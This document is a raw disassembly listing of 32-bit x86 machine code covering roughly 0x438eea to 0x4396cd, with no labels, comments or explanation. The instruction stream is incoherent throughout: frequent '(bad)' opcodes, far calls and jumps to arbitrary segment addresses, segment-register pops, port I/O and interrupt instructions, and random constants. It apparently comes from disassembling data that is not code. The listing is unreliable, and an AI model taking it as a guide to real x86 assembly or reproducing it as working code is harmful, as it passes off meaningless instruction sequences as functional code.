  438eea:	frndint 
  438eec:	mov    DWORD PTR [eax+eax*4-0x35ebb9fd],esp
  438ef3:	fwait
  438ef4:	xor    ebx,esp
  438ef6:	not    ah
  438ef8:	(bad)  
  438efa:	mov    dl,0xf3
  438efc:	mov    edi,0x89db5829
  438f01:	and    ah,ch
  438f03:	xor    eax,0x325f4b18
  438f08:	nop
  438f09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438f0a:	sbb    al,0xd7
  438f0c:	or     eax,0xc14e7ef6
  438f11:	sub    al,0x36
  438f13:	int3   
  438f14:	mov    BYTE PTR [edi+0x70dd1c74],cl
  438f1a:	mov    WORD PTR [eax],gs
  438f1c:	add    DWORD PTR ds:0x61997c12,0xffffffd3
  438f23:	retf   0x9fb8
  438f26:	pop    ds
  438f27:	pop    ebp
  438f28:	pop    esp
  438f29:	jp     0x438ed8
  438f2b:	adc    ebx,esi
  438f2d:	mov    ds:0x5edcadd,al
  438f32:	pusha  
  438f33:	jae    0x438efa
  438f35:	icebp  
  438f36:	leave  
  438f37:	test   eax,0x437d9ba6
  438f3c:	call   0x9e44:0x4e2c3ef8
  438f43:	ficom  DWORD PTR [esi+0x30d4f32b]
  438f49:	mov    al,ds:0x7d13a874
  438f4e:	fdiv   st(5),st
  438f50:	mov    dl,0xb7
  438f52:	jmp    0x438f9f
  438f54:	lea    ebx,[esi]
  438f56:	sbb    ecx,ebp
  438f58:	test   eax,0x6f6e8b02
  438f5d:	mov    ebx,0xeb084759
  438f62:	jne    0x438f7d
  438f64:	mov    BYTE PTR [eax+eiz*2+0x64408e91],dh
  438f6b:	daa    
  438f6c:	pop    eax
  438f6d:	push   ecx
  438f6e:	and    DWORD PTR [eax],esi
  438f70:	int3   
  438f71:	lahf   
  438f72:	popf   
  438f73:	imul   esi,DWORD PTR [eax],0xffffffe5
  438f76:	lock aam 0x29
  438f79:	hlt    
  438f7a:	mov    dl,0xdd
  438f7c:	int3   
  438f7d:	dec    ebp
  438f7e:	into   
  438f7f:	das    
  438f80:	mov    ch,0xe3
  438f82:	pop    ebx
  438f83:	pop    ds
  438f84:	or     BYTE PTR [esi+eiz*4],ah
  438f87:	inc    ebx
  438f88:	push   esi
  438f89:	das    
  438f8a:	xor    al,0xd4
  438f8c:	mov    dh,0x71
  438f8e:	add    DWORD PTR [edi-0x1df7e404],edi
  438f94:	mov    eax,0x89600680
  438f99:	xlat   BYTE PTR ds:[ebx]
  438f9a:	mov    ch,0x99
  438f9c:	scas   eax,DWORD PTR es:[edi]
  438f9d:	and    BYTE PTR [esi+0x76],0x5a
  438fa1:	add    edx,DWORD PTR [ebx+edi*2]
  438fa4:	inc    esp
  438fa5:	xchg   ebp,eax
  438fa6:	sar    BYTE PTR [edx+0x7a],1
  438fa9:	fwait
  438faa:	xchg   edi,eax
  438fab:	cdq    
  438fac:	mov    eax,ds:0x14594217
  438fb1:	mov    ebp,0x18159360
  438fb6:	pop    ecx
  438fb7:	test   DWORD PTR [edi+0x3],esp
  438fba:	cmp    bl,bh
  438fbc:	sub    BYTE PTR [esi],0xa2
  438fbf:	pop    ebx
  438fc0:	and    dl,cl
  438fc2:	pop    ds
  438fc3:	(bad)  [edi-0x5db0d98a]
  438fc9:	jle    0x438f5d
  438fcb:	stos   DWORD PTR es:[edi],eax
  438fcc:	xor    ch,BYTE PTR [ebx+0x3a]
  438fcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438fd0:	xchg   edx,eax
  438fd1:	and    eax,0xc2aab2f8
  438fd6:	nop
  438fd7:	arpl   bp,bx
  438fd9:	dec    ecx
  438fda:	xchg   ebp,eax
  438fdb:	push   es
  438fdc:	or     DWORD PTR [edx],esp
  438fde:	ins    BYTE PTR es:[edi],dx
  438fdf:	nop
  438fe0:	and    al,0x4c
  438fe2:	repnz aad 0xa2
  438fe5:	jns    0x439021
  438fe7:	pop    ecx
  438fe8:	mov    eax,0x61cbed38
  438fed:	cli    
  438fee:	sub    BYTE PTR [ecx],ch
  438ff0:	scas   eax,DWORD PTR es:[edi]
  438ff1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438ff2:	mov    dh,0xe1
  438ff4:	mov    DWORD PTR [ebx],eax
  438ff6:	mov    ebx,0x95c88e06
  438ffb:	aam    0xfa
  438ffd:	or     esi,DWORD PTR [eax]
  438fff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439000:	cmp    esp,ebx
  439002:	pop    es
  439003:	std    
  439004:	mov    DWORD PTR [ebp-0x3f94ea63],edx
  43900a:	mov    al,ds:0xa0251c7
  43900f:	popf   
  439010:	jno    0x438fdd
  439012:	inc    ebp
  439013:	in     eax,dx
  439014:	int3   
  439015:	sahf   
  439016:	pop    ecx
  439017:	xor    DWORD PTR [ebx+0x5c7e1f53],0xa637c7ae
  439021:	add    eax,0xe315abc8
  439026:	sub    ah,BYTE PTR ds:0x960b5dc
  43902c:	cmp    DWORD PTR [esi-0x78],esp
  43902f:	dec    ecx
  439030:	cld    
  439031:	nop    edi
  439034:	jo     0x438fd7
  439036:	push   0x6211c8b2
  43903b:	add    ebp,esi
  43903d:	das    
  43903e:	in     al,0xd4
  439040:	and    BYTE PTR [eax-0x54790d54],al
  439046:	add    eax,0xcf856d4
  43904b:	mov    cl,bh
  43904d:	outs   dx,BYTE PTR ds:[esi]
  43904e:	call   0x80451906
  439053:	mov    cl,0xa0
  439055:	push   eax
  439056:	xchg   edx,eax
  439057:	loope  0x439053
  439059:	pop    ds
  43905a:	bound  ecx,QWORD PTR [edx-0x32]
  43905d:	icebp  
  43905e:	popf   
  43905f:	lods   eax,DWORD PTR ds:[esi]
  439060:	push   0x8968d66d
  439065:	jmp    0x4942317a
  43906a:	sti    
  43906b:	mov    esi,0xe6248327
  439070:	mov    eax,ds:0x645f3ea5
  439075:	jmp    0x164a:0xb6a9e766
  43907c:	pop    eax
  43907d:	loop   0x4390a1
  43907f:	xor    eax,ebp
  439081:	add    bh,BYTE PTR [esi]
  439083:	ins    DWORD PTR es:[edi],dx
  439084:	mov    al,0x3a
  439086:	mov    WORD PTR [eax+edi*1-0x2bf8e1e4],?
  43908d:	sti    
  43908e:	add    al,0xe6
  439090:	cmp    cl,al
  439092:	lods   al,BYTE PTR ds:[esi]
  439093:	shl    cl,cl
  439095:	jg     0x439078
  439097:	mov    eax,0x7690fb02
  43909c:	sahf   
  43909d:	xchg   ecx,eax
  43909e:	pusha  
  43909f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4390a0:	outs   dx,DWORD PTR ds:[esi]
  4390a1:	loop   0x4390c6
  4390a3:	ds cdq 
  4390a5:	js     0x4390ff
  4390a7:	cmc    
  4390a8:	jmp    0xd534acb2
  4390ad:	jo     0x4390c9
  4390af:	(bad)  
  4390b1:	(bad)  
  4390b2:	mov    al,0xb
  4390b4:	mov    ebx,0xbd55d09d
  4390b9:	add    ah,BYTE PTR [esi]
  4390bb:	sub    al,0x68
  4390bd:	fstp   TBYTE PTR [esi-0x72]
  4390c0:	dec    esp
  4390c1:	add    ah,dl
  4390c3:	adc    al,0x7
  4390c5:	mov    cl,0xf
  4390c7:	idiv   DWORD PTR ds:0x95291f6c
  4390cd:	adc    al,0xb3
  4390cf:	aam    0x2c
  4390d1:	out    dx,al
  4390d2:	pop    esp
  4390d3:	aad    0xdd
  4390d5:	out    0x3,eax
  4390d7:	js     0x4390d5
  4390d9:	pop    edx
  4390da:	ja     0x4390e6
  4390dc:	mov    BYTE PTR [ecx-0x27000a74],ah
  4390e2:	es hlt 
  4390e4:	rol    BYTE PTR ds:0x93e694aa,cl
  4390ea:	xlat   BYTE PTR ds:[ebx]
  4390eb:	das    
  4390ec:	idiv   BYTE PTR [ebx-0x107facb5]
  4390f2:	jl     0x439079
  4390f4:	fild   WORD PTR [eax-0x1a]
  4390f7:	retf   0x99a
  4390fa:	and    BYTE PTR [esi+0x7c],bl
  4390fd:	add    esp,DWORD PTR [eax+0x7a771c7c]
  439103:	xor    ebp,DWORD PTR [ebp-0x830e0c9]
  439109:	inc    ebx
  43910a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43910b:	adc    DWORD PTR [edx],ebx
  43910d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43910e:	cmp    dl,dh
  439110:	push   0x3e2a1ba7
  439115:	mov    edx,0x3b2c9548
  43911a:	pop    ds
  43911b:	cmp    ebx,DWORD PTR [edi+ebx*4-0x40]
  43911f:	cmp    ah,bl
  439121:	inc    esi
  439122:	jmp    0x4390e5
  439124:	mov    dl,0xe3
  439126:	mov    ecx,0x582151d4
  43912b:	sub    BYTE PTR [ebx*1-0x2a74f78],0x1f
  439133:	iret   
  439134:	arpl   sp,ax
  439136:	mov    BYTE PTR [ebx],dh
  439138:	pop    edx
  439139:	scas   al,BYTE PTR es:[edi]
  43913a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43913b:	popf   
  43913c:	aad    0xed
  43913e:	dec    eax
  43913f:	push   esp
  439140:	xor    dh,BYTE PTR [ebx+eax*8]
  439143:	mov    edx,DWORD PTR [ecx+eax*4+0x6e374360]
  43914a:	sar    BYTE PTR [edx],1
  43914c:	fcom   QWORD PTR [eax]
  43914e:	imul   BYTE PTR [ebx-0x18478634]
  439154:	mov    ds:0x1a412865,eax
  439159:	sbb    BYTE PTR [esi],bl
  43915b:	iret   
  43915c:	xchg   ebp,eax
  43915d:	cli    
  43915e:	inc    edx
  43915f:	add    bl,dh
  439161:	in     eax,dx
  439162:	and    DWORD PTR [eax+0x3eb26308],edi
  439168:	or     esp,ecx
  43916a:	mov    BYTE PTR [ebx+0x13],al
  43916d:	js     0x4391e3
  43916f:	sbb    DWORD PTR ds:0x49ba090f,eax
  439175:	aad    0x8d
  439177:	adc    al,0xa9
  439179:	rcl    bh,0x3c
  43917c:	or     DWORD PTR [ebp+ebp*2-0x4aad772f],ecx
  439183:	inc    eax
  439184:	scas   eax,DWORD PTR es:[edi]
  439185:	xor    ch,BYTE PTR [ebp-0x6a]
  439188:	mov    al,0x8f
  43918a:	cmp    eax,0x2f378950
  43918f:	cmp    eax,0xd5692ace
  439194:	popa   
  439195:	sbb    cl,cl
  439197:	inc    eax
  439198:	call   0x897733b4
  43919d:	aas    
  43919e:	mov    eax,0x1da5eda0
  4391a3:	or     esi,DWORD PTR [ebx+0x36]
  4391a6:	adc    al,0xef
  4391a8:	fadd   QWORD PTR [edx]
  4391aa:	fs jmp 0xa6718e87
  4391b0:	xchg   ebp,eax
  4391b1:	dec    edi
  4391b2:	xor    eax,0x5e9d8d7
  4391b7:	pop    ss
  4391b8:	sub    eax,0xe0bc3133
  4391bd:	test   BYTE PTR [edi],al
  4391bf:	push   edx
  4391c0:	xor    BYTE PTR [edx-0x55],al
  4391c3:	out    0x2,eax
  4391c5:	add    ah,BYTE PTR [esi-0xf]
  4391c8:	inc    esi
  4391c9:	sub    al,0x65
  4391cb:	jmp    0x439244
  4391cd:	cmp    al,0x58
  4391cf:	test   eax,0x14e23a7d
  4391d4:	push   ecx
  4391d5:	ins    BYTE PTR es:[edi],dx
  4391d6:	push   ecx
  4391d7:	or     cl,BYTE PTR [eax+0x2e12d5b4]
  4391dd:	retf   
  4391de:	pusha  
  4391df:	aas    
  4391e0:	jns    0x4391d1
  4391e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4391e3:	repz push edx
  4391e5:	sbb    bh,dh
  4391e7:	stos   DWORD PTR es:[edi],eax
  4391e8:	stc    
  4391e9:	fiadd  DWORD PTR [ecx-0x6f]
  4391ec:	mov    ds:0xfca1c002,al
  4391f1:	sub    al,0xb7
  4391f3:	push   ebp
  4391f5:	and    DWORD PTR [eax-0x3],0x2
  4391f9:	fadd   st,st(4)
  4391fb:	jb     0x4391cc
  4391fd:	daa    
  4391fe:	sub    cl,BYTE PTR [ebx+0x9]
  439201:	icebp  
  439202:	loopne 0x439192
  439204:	je     0x439223
  439206:	adc    esp,DWORD PTR [edx-0x77]
  439209:	out    dx,eax
  43920a:	ins    DWORD PTR es:[edi],dx
  43920b:	ficom  DWORD PTR [edx+0x1c]
  43920e:	and    al,0x47
  439210:	(bad)  
  439212:	int3   
  439213:	push   0x8
  439215:	fs mov ebx,es
  439218:	jle    0x43919c
  43921a:	data16 clc 
  43921c:	mov    bl,cl
  43921e:	mov    ds:0x892babca,al
  439223:	pop    ss
  439224:	shl    cl,cl
  439226:	pop    ss
  439227:	aam    0x8c
  439229:	xor    al,0xa9
  43922b:	(bad)  
  43922c:	xlat   BYTE PTR ds:[ebx]
  43922d:	add    BYTE PTR [ebp+0x44d38afc],cl
  439233:	shl    DWORD PTR ds:0xb397ec46,1
  439239:	cs lock aad 0x16
  43923d:	pop    ebp
  43923e:	int3   
  43923f:	push   edx
  439240:	loope  0x439227
  439242:	jne    0x43922d
  439244:	adc    BYTE PTR [ebp-0x48],0xd5
  439248:	popa   
  439249:	leave  
  43924a:	mov    ds:0xaa02a35d,eax
  43924f:	mov    BYTE PTR [eax-0xf],cl
  439252:	(bad)  
  439253:	mov    ds:0xb609856,al
  439258:	pop    edx
  439259:	ins    DWORD PTR es:[edi],dx
  43925a:	pop    edi
  43925b:	rol    BYTE PTR [esi+ebx*8-0x36],cl
  43925f:	lahf   
  439260:	pop    es
  439261:	add    ebp,DWORD PTR ds:0x6efc0cd2
  439267:	mov    dl,0x49
  439269:	sbb    DWORD PTR [ecx+0x1],0x9b6d61ad
  439270:	mov    edx,DWORD PTR [ebp+0x293c7a5a]
  439276:	(bad)  
  439277:	jmp    0x9109:0xd59aef04
  43927e:	jae    0x4392c5
  439280:	test   al,dl
  439282:	fst    QWORD PTR [edx-0x4b]
  439285:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439286:	or     esp,DWORD PTR [edx]
  439288:	mov    DWORD PTR [edx+0x38ce3372],edx
  43928e:	paddq  mm3,QWORD PTR [ebp-0x41]
  439292:	add    eax,DWORD PTR [eax+edx*1-0x774285b1]
  439299:	lds    edi,FWORD PTR [esi-0x5951f278]
  43929f:	jns    0x4392c2
  4392a1:	add    BYTE PTR [ecx+edi*1],bl
  4392a4:	pop    esi
  4392a5:	push   eax
  4392a6:	fsub   DWORD PTR [edx+eax*8-0x3e]
  4392aa:	push   edi
  4392ab:	and    dl,BYTE PTR [ebp-0x5a1166d3]
  4392b1:	and    BYTE PTR [ebx+0x4d148242],0xc1
  4392b8:	push   ss
  4392b9:	add    bl,BYTE PTR [eax]
  4392bb:	inc    ebp
  4392bc:	or     ecx,ebx
  4392be:	mov    ecx,0x6dd5e653
  4392c3:	pop    ds
  4392c4:	jge    0x439246
  4392c6:	(bad)
  4392c9:	les    ebx,FWORD PTR [ebx-0x3a]
  4392cc:	sbb    BYTE PTR [edx],al
  4392ce:	pop    esi
  4392cf:	ins    DWORD PTR es:[edi],dx
  4392d0:	scas   eax,DWORD PTR es:[edi]
  4392d1:	jp     0x439327
  4392d3:	inc    eax
  4392d4:	call   0xf0c90b93
  4392d9:	jbe    0x4392ec
  4392db:	dec    eax
  4392dc:	or     al,0x2
  4392de:	or     al,0x52
  4392e0:	jg     0x439277
  4392e2:	(bad)  
  4392e3:	cmp    esp,edx
  4392e5:	sub    BYTE PTR [esi],ah
  4392e7:	pop    ecx
  4392e8:	mov    cs,WORD PTR [edi+0x28]
  4392eb:	mov    dl,0x80
  4392ed:	gs xchg ecx,eax
  4392ef:	adc    eax,0xd450bc9a
  4392f4:	ror    eax,cl
  4392f6:	fs cmp al,ch
  4392f9:	(bad)  
  4392fb:	and    ecx,DWORD PTR [eax-0x558f5e3d]
  439301:	les    edx,FWORD PTR [eax-0x51fdc733]
  439307:	ja     0x4392ff
  439309:	jno    0x439326
  43930b:	pop    ecx
  43930c:	mov    dh,0x89
  43930e:	pusha  
  43930f:	and    eax,0xc207120b
  439314:	add    al,0x11
  439316:	(bad)  
  439318:	fdivr  QWORD PTR [esi+0x493a80ad]
  43931e:	test   DWORD PTR [ecx],ecx
  439320:	(bad)  
  439321:	fisttp QWORD PTR [edx+0x39]
  439324:	lods   eax,DWORD PTR ds:[esi]
  439325:	arpl   WORD PTR [edi-0x2062760c],bp
  43932b:	in     eax,dx
  43932c:	cmp    ebx,esi
  43932e:	sub    DWORD PTR [ebp-0x78],ebp
  439331:	mov    edx,ebp
  439333:	xchg   ecx,eax
  439334:	or     edi,edi
  439336:	xor    eax,0x4d08f037
  43933b:	mov    BYTE PTR [eax],al
  43933d:	mov    esi,0x48aed2b7
  439342:	jne    0x43935e
  439344:	sub    DWORD PTR [ebp-0x56],esp
  439347:	push   cs
  439348:	mov    DWORD PTR [ebx],eax
  43934a:	inc    eax
  43934b:	jno    0x439382
  43934d:	inc    ecx
  43934e:	dec    eax
  43934f:	mov    BYTE PTR [ecx],al
  439351:	add    dl,al
  439353:	push   es
  439354:	cdq    
  439355:	loopne 0x439344
  439357:	mov    eax,ds:0xa91f0c9e
  43935c:	test   eax,0xd0b8ba4f
  439361:	and    BYTE PTR [ebp-0x7546c22c],dl
  439367:	mov    ?,WORD PTR [edi+edi*2]
  43936a:	mov    ds:0xcd6f89f2,al
  43936f:	mov    bl,0xf3
  439371:	in     al,dx
  439372:	in     al,0x1e
  439374:	cs pop ds
  439376:	outs   dx,BYTE PTR ds:[esi]
  439377:	sbb    eax,DWORD PTR [ecx]
  439379:	icebp  
  43937a:	fdivr  st(7),st
  43937c:	mov    DWORD PTR [eax-0x4bc3634a],esp
  439382:	pusha  
  439383:	stc    
  439384:	pop    ds
  439385:	(bad)  
  439387:	sub    ah,BYTE PTR [eax+0x27]
  43938a:	loope  0x439360
  43938c:	jmp    0xc957bb7b
  439391:	push   edi
  439392:	jne    0x43933c
  439394:	push   ecx
  439395:	popf   
  439396:	pop    esp
  439397:	mov    ebx,0x6fe0ed0d
  43939c:	xor    al,BYTE PTR [edi-0x6a]
  43939f:	mov    cl,BYTE PTR [eax+0x1d]
  4393a2:	mov    dl,0xf3
  4393a4:	stc    
  4393a5:	push   cs
  4393a6:	adc    eax,ebp
  4393a8:	sbb    BYTE PTR [ebp+0x758c938e],bl
  4393ae:	clc    
  4393af:	xchg   ebp,eax
  4393b0:	pop    es
  4393b1:	push   esp
  4393b2:	cmp    al,0x14
  4393b4:	fs ja  0x43939f
  4393b7:	aam    0x91
  4393b9:	hlt    
  4393ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4393bb:	rcl    BYTE PTR [esi-0x713ef197],1
  4393c1:	dec    ecx
  4393c2:	leave  
  4393c3:	stos   BYTE PTR es:[edi],al
  4393c4:	es out 0xcc,al
  4393c7:	fidiv  DWORD PTR [ebp+0x42]
  4393ca:	sub    eax,0x490376b2
  4393cf:	aad    0x1
  4393d1:	test   eax,0xb38c770c
  4393d6:	mov    ah,0x51
  4393d8:	mov    DWORD PTR [edi+0x4deec508],esp
  4393de:	push   esi
  4393df:	retfw  0x9605
  4393e3:	or     al,0xf7
  4393e5:	dec    eax
  4393e6:	mov    esi,0x60c6b5f8
  4393eb:	cmc    
  4393ec:	aad    0x95
  4393ee:	push   0xa24de227
  4393f3:	aad    0x50
  4393f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4393f6:	test   eax,0xbc3e9c2b
  4393fb:	sbb    eax,0x3ab48b89
  439400:	test   eax,0x9eff0d4a
  439405:	cli    
  439406:	dec    esp
  439407:	mov    eax,0xce22019a
  43940c:	mov    dh,0x5
  43940e:	ds mov edx,0xc62a7a2f
  439414:	jle    0x43946a
  439416:	push   ds
  439417:	(bad)  
  439419:	mov    ch,0x61
  43941b:	sbb    ebp,ebp
  43941d:	stos   BYTE PTR es:[edi],al
  43941e:	icebp  
  43941f:	and    al,0xc0
  439421:	daa    
  439422:	push   ds
  439423:	mov    bh,0xb
  439425:	int3   
  439426:	cld    
  439427:	lea    ebx,[ebp+0x1fb1f7a]
  43942d:	dec    edi
  43942e:	cld    
  43942f:	xchg   ecx,eax
  439430:	add    al,0xe3
  439432:	push   edx
  439433:	stos   BYTE PTR es:[edi],al
  439434:	ret    
  439435:	sbb    al,0xf7
  439437:	lods   eax,DWORD PTR ds:[esi]
  439438:	xchg   esi,eax
  439439:	in     eax,0x81
  43943b:	jns    0x439472
  43943d:	mov    ah,0x5d
  43943f:	pop    ecx
  439440:	sbb    DWORD PTR [eax+0x61],edx
  439443:	xchg   ecx,eax
  439444:	and    al,0x27
  439446:	ins    BYTE PTR es:[edi],dx
  439447:	push   ss
  439448:	call   0xa8180e5a
  43944d:	sahf   
  43944e:	outs   dx,DWORD PTR ds:[esi]
  43944f:	push   ds
  439450:	shl    DWORD PTR [esi+0x6f88a3a8],cl
  439456:	and    al,0x53
  439458:	and    DWORD PTR [esi+0x2e9b2c1],eax
  43945e:	inc    eax
  43945f:	xor    eax,0xca6faaca
  439464:	ss aas 
  439466:	pop    ds
  439467:	lahf   
  439468:	cmp    ecx,edi
  43946a:	pop    es
  43946b:	adc    ebp,DWORD PTR [eax+0x15]
  43946e:	rol    ebp,0xa5
  439471:	add    eax,0x15b1e210
  439476:	cmp    dh,BYTE PTR [edx]
  439478:	(bad)  
  439479:	xlat   BYTE PTR ds:[ebx]
  43947a:	pop    ds
  43947b:	lahf   
  43947c:	xchg   ebp,eax
  43947d:	jno    0x4394d2
  43947f:	leave  
  439480:	lods   al,BYTE PTR ds:[esi]
  439481:	ret    
  439482:	rcl    ebp,0xee
  439485:	popf   
  439486:	jg     0x439424
  439488:	shr    BYTE PTR [eax],1
  43948a:	fnsave [ebx-0x4b027278]
  439490:	call   0xf1fb:0x70c88756
  439497:	aad    0x77
  439499:	les    ebx,FWORD PTR [edi+esi*8]
  43949c:	scas   eax,DWORD PTR es:[edi]
  43949d:	mov    al,ds:0x43864bdb
  4394a2:	sub    eax,DWORD PTR [edx+esi*4]
  4394a5:	add    BYTE PTR [edi+0x6a7aa953],bl
  4394ab:	inc    edi
  4394ac:	jne    0x439490
  4394ae:	pop    ds
  4394af:	add    ch,0xdd
  4394b2:	adc    ecx,DWORD PTR [ecx]
  4394b4:	push   ecx
  4394b5:	(bad)  
  4394b6:	xchg   edx,eax
  4394b7:	pop    es
  4394b8:	pop    es
  4394b9:	adc    eax,0x78d00b11
  4394be:	or     DWORD PTR [esi],ecx
  4394c0:	or     DWORD PTR [ebp-0x7b56ee75],eax
  4394c6:	imul   DWORD PTR [esi]
  4394c8:	mov    bh,ch
  4394ca:	fwait
  4394cb:	test   BYTE PTR [ecx+0xb],dl
  4394ce:	adc    al,0x3c
  4394d0:	popa   
  4394d1:	add    al,0x61
  4394d3:	popa   
  4394d4:	and    bl,al
  4394d6:	inc    esp
  4394d7:	jmp    0x43951b
  4394d9:	(bad)  
  4394da:	sbb    al,0xed
  4394dc:	aad    0x72
  4394de:	pop    edi
  4394df:	(bad)  
  4394e0:	out    0x5,eax
  4394e2:	pop    esp
  4394e3:	stc    
  4394e4:	sbb    ah,ch
  4394e6:	jmp    0xa751:0xe05fe
  4394ed:	add    DWORD PTR [edi],eax
  4394ef:	dec    esp
  4394f0:	xchg   BYTE PTR [edi+0x530917e0],bh
  4394f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4394f7:	xchg   BYTE PTR [eax+eax*1+0x1811e3f0],ch
  4394fe:	cmc    
  4394ff:	add    al,0xdb
  439501:	popf   
  439502:	mov    dh,0xfb
  439504:	je     0x4394c3
  439506:	pop    ds
  439507:	and    eax,0xc078c5d9
  43950c:	or     BYTE PTR [ecx],cl
  43950e:	adc    bh,dl
  439510:	jmp    0x4394b7
  439512:	cwde   
  439513:	test   al,0x10
  439515:	xor    eax,0x987d5fe0
  43951a:	mov    edi,0x6965864a
  43951f:	leave  
  439520:	iret   
  439521:	adc    edi,edi
  439523:	push   edx
  439524:	sub    ah,dl
  439526:	cdq    
  439527:	mov    ecx,0x3b278771
  43952c:	dec    ecx
  43952d:	dec    esp
  43952e:	add    al,dl
  439530:	xor    al,bh
  439532:	pop    ds
  439533:	rcl    DWORD PTR [edi+0x2495021e],0xe8
  43953a:	call   esp
  43953c:	push   esi
  43953d:	data16 sub WORD PTR [bp+si-0x207b],0xd89
  439546:	mov    al,ds:0xc8370ef4
  43954b:	add    edx,DWORD PTR [edi+0x3018ea05]
  439551:	push   es
  439552:	cmp    eax,0x9caef749
  439557:	lea    ecx,[ebx+eax*1]
  43955a:	in     al,0x93
  43955c:	aam    0x6e
  43955e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43955f:	mov    esp,0x58a60398
  439564:	dec    ecx
  439565:	stc    
  439566:	popa   
  439567:	loope  0x439558
  439569:	int    0x9c
  43956b:	ins    DWORD PTR es:[edi],dx
  43956c:	mov    BYTE PTR [ecx],bh
  43956e:	bound  esp,QWORD PTR [ebx]
  439570:	xchg   ebx,eax
  439571:	xor    ah,BYTE PTR [ebp-0x6]
  439574:	and    al,BYTE PTR [edx]
  439576:	sub    al,0xc1
  439578:	push   0x147b779b
  43957d:	int    0x60
  43957f:	addr16 call 0xd5a4:0x7edb51ed
  439587:	aad    0x0
  439589:	mov    ch,0xce
  43958b:	(bad)  
  43958c:	sub    al,0xe2
  43958e:	iret   
  43958f:	or     BYTE PTR [eax+0x402d05b5],0x5e
  439596:	outs   dx,BYTE PTR ds:[esi]
  439597:	add    DWORD PTR [ebp+eax*1-0x2efe073e],ecx
  43959e:	adc    ebp,DWORD PTR [esi]
  4395a0:	inc    ebp
  4395a1:	int    0x99
  4395a3:	cmp    eax,esp
  4395a5:	add    cl,BYTE PTR [esp+ebp*4]
  4395a8:	jmp    FWORD PTR [eax+0x7d]
  4395ab:	xor    ah,BYTE PTR [eax]
  4395ad:	add    bh,BYTE PTR [eax+0x6]
  4395b0:	inc    esi
  4395b1:	sub    edx,esp
  4395b3:	nop
  4395b4:	mov    eax,ecx
  4395b6:	pusha  
  4395b7:	pop    es
  4395b8:	fnstenv [esi-0x233905ea]
  4395be:	repnz aam 0x18
  4395c1:	adc    bh,BYTE PTR [ebx]
  4395c3:	test   DWORD PTR [ecx+0x79],esp
  4395c6:	push   di
  4395c8:	mov    BYTE PTR [edi],ah
  4395ca:	xor    DWORD PTR [eax+0x66],eax
  4395cd:	and    BYTE PTR [ecx+0x67],bh
  4395d0:	mov    ebp,0x51ef1002
  4395d5:	adc    BYTE PTR [ebp+0x1d2e4918],al
  4395db:	inc    eax
  4395dc:	mov    BYTE PTR [edi+0x53],ch
  4395df:	retf   
  4395e0:	or     ch,bl
  4395e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4395e3:	stc    
  4395e4:	push   edx
  4395e5:	add    al,BYTE PTR [esi+0x4097ee30]
  4395eb:	rcr    DWORD PTR [edx+0x7b],0x1e
  4395ef:	cdq    
  4395f0:	inc    ebp
  4395f1:	push   es
  4395f2:	repnz and eax,0xd4e52982
  4395f8:	mov    eax,ds:0x460943de
  4395fd:	test   BYTE PTR [esi+0x658b8808],ch
  439603:	jle    0x4395bf
  439605:	push   edx
  439606:	add    bh,cl
  439608:	cmp    eax,DWORD PTR [eax]
  43960a:	xchg   esi,eax
  43960b:	mov    ch,0x45
  43960d:	sub    eax,0xc3008cff
  439612:	addr16 jmp 0x43959d
  439615:	rol    DWORD PTR [ebp-0x5b8db513],0x43
  43961c:	add    DWORD PTR ds:0x8718be16,0x66e515a4
  439626:	pop    ds
  439627:	xchg   ecx,eax
  439628:	jmp    0x359:0xc8b20053
  43962f:	xlat   BYTE PTR ds:[ebx]
  439630:	(bad)  
  439631:	sar    BYTE PTR [eax+0x2cc18147],0xc2
  439638:	jp     0x439672
  43963a:	pop    ds
  43963b:	mov    bh,0x84
  43963d:	scas   al,BYTE PTR es:[edi]
  43963e:	add    dh,dh
  439640:	mov    fs:0x648bd4a5,al
  439646:	call   0x7a80:0xb0c55dcd
  43964d:	repnz pop ds
  43964f:	lahf   
  439650:	cmp    DWORD PTR [ebp-0x481dac85],ecx
  439656:	in     al,0xd2
  439658:	inc    edi
  439659:	mov    WORD PTR [edx],cs
  43965b:	xchg   ebp,eax
  43965c:	push   0x76
  43965e:	push   ebx
  43965f:	pop    eax
  439660:	or     BYTE PTR [esi],cl
  439662:	cdq    
  439663:	adc    eax,0xaf1e5d4c
  439668:	shl    dh,cl
  43966a:	pushf  
  43966b:	mov    ecx,0xd46e116a
  439670:	sbb    DWORD PTR [esi+0x6b93a7b6],0x28
  439677:	jp     0x439670
  439679:	or     esi,esi
  43967b:	mov    ebx,0x5734ca97
  439680:	das    
  439681:	stos   DWORD PTR es:[edi],eax
  439682:	pop    edi
  439683:	(bad)  
  439684:	lar    esi,WORD PTR [eax-0x4a58895f]
  43968b:	cmp    dh,BYTE PTR [esi+eax*8+0x7198979b]
  439692:	clc    
  439693:	sahf   
  439694:	sbb    DWORD PTR [eax-0x61],0x579ed9dd
  43969b:	push   0xffffff93
  43969d:	add    bh,BYTE PTR [ecx+esi*8-0x15]
  4396a1:	enter  0xda50,0xd0
  4396a5:	and    al,0x1f
  4396a7:	cmp    DWORD PTR [ecx-0x3d],edi
  4396aa:	and    al,0xd7
  4396ac:	push   ds
  4396ad:	retf   0xd56d
  4396b0:	(bad)  
  4396b1:	(bad)  
  4396b3:	ret    
  4396b4:	in     eax,dx
  4396b5:	or     BYTE PTR [eax],0x64
  4396b8:	mov    BYTE PTR [ebx],ah
  4396ba:	in     eax,0x7a
  4396bc:	sar    DWORD PTR [ebx-0x68],0x41
  4396c0:	test   BYTE PTR [edx],0xae
  4396c3:	aam    0x6b
  4396c5:	xor    BYTE PTR [esi+0x56],ch
  4396c8:	mov    esi,0x8823c0fd
  4396cd:	lahf   
